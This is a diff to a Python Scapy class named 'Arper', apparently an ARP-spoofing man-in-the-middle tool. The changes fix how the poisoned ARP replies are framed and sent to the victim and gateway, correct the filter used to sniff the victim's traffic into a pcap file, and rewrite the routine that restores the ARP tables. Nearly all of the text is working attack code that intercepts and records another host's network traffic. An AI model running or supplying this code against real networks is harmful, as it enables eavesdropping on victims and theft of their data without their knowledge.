@@ -71,8 +71,8 @@ class Arper:
             sys.stdout.flush()
 
             try:
-                send(poison_victim)
-                send(poison_gateway)
+                send(Ether(dst=self.victimmac) / poison_victim)
+                send(Ether(dst=self.gatewaymac) / poison_gateway)
             except KeyboardInterrupt as e:
                 self.restore()
                 sys.exit()
@@ -83,7 +83,7 @@ class Arper:
         time.sleep(5)
         print(f'Sniffing {count} packets')
 
-        bpf_filter = "host %s" % victim
+        bpf_filter = "host %s" % self.victim
         packets = sniff(count = count, filter = bpf_filter, iface = self.interface)
         wrpcap('arper.pcap', packets)
         print('Got the packets')
@@ -93,14 +93,22 @@ class Arper:
 
     def restore(self):
         print('Restoring the ARP tables')
-        send(ARP(
+        # Restore victim's ARP table
+        send(Ether(dst=self.victimmac) / ARP(
             op = 2,
             psrc = self.gateway,
             hwsrc = self.gatewaymac,
             pdst = self.victim,
-            hwdst = 'ff:ff:ff:ff:ff:ff',
-            count = 5
-        ))
+            hwdst = self.victimmac
+        ), count = 5)
+        # Restore gateway's ARP table
+        send(Ether(dst=self.gatewaymac) / ARP(
+            op = 2,
+            psrc = self.victim,
+            hwsrc = self.victimmac,
+            pdst = self.gateway,
+            hwdst = self.gatewaymac
+        ), count = 5)
 
 if __name__ == '__main__':
     (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
